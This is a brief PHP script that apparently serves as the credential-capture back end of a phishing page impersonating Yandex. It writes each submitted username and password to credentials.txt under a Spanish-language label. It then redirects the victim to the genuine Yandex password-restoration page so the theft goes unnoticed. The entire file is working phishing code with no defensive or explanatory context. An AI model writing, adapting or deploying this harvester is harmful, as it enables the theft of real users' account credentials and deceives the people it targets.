<?php

file_put_contents("credentials.txt", "[+] Yandex -> Usuario: " . $_POST['login'] . " Contraseña: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://passport.yandex.com/restoration');
exit();
?>
